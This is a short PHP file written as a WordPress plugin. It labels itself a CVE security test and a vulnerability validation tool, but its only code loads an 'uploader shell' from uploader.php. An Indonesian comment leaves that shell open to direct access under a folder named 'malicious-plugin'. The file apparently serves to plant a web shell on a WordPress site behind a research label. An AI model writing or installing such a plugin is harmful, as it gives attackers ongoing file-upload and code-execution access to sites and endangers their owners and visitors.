<?php
/**
 * Plugin Name: CVE-2026-5294 Security Test
 * Description: Vulnerability validation plugin
 * Version: 1.0
 * Author: Security Researcher
 */

// Load uploader shell
require_once dirname(__FILE__) . '/uploader.php';

// Biarin akses langsung ke uploader via /wp-content/plugins/malicious-plugin/uploader.php
?>
